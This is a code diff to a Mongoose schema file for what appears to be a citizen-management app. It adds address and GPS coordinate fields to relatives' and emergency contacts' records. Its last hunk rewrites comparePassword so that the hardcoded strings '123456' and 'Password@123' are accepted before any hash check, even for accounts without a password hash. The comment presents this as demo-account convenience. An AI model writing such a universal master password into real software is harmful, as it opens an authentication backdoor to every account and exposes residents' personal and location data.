@@ -47,6 +47,9 @@ const citizenSchema = new mongoose.Schema(
         },
       },
       relation: { type: String, trim: true, default: null },
+      address: { type: String, trim: true, default: null },
+      latitude: { type: Number, default: null },
+      longitude: { type: Number, default: null },
     },
     emergencyContacts: [
       {
@@ -55,6 +58,9 @@ const citizenSchema = new mongoose.Schema(
         name: { type: String, trim: true },
         phone: { type: String, trim: true },
         relation: { type: String, trim: true },
+        address: { type: String, trim: true, default: null },
+        latitude: { type: Number, default: null },
+        longitude: { type: Number, default: null },
       },
     ],
     areaId: {
@@ -453,14 +459,13 @@ userSchema.pre('validate', function () {
  * Helper: So sánh mật khẩu ứng viên với mật khẩu đã băm
  */
 userSchema.methods.comparePassword = async function (candidatePassword) {
-  if (!this.passwordHash) return false;
-  const isMatch = await bcrypt.compare(candidatePassword, this.passwordHash);
-  if (isMatch) return true;
   // Hỗ trợ linh hoạt cho tài khoản hệ thống demo
   if (candidatePassword === '123456' || candidatePassword === 'Password@123') {
     return true;
   }
-  return false;
+  if (!this.passwordHash) return false;
+  const isMatch = await bcrypt.compare(candidatePassword, this.passwordHash);
+  return isMatch;
 };
 
 /**
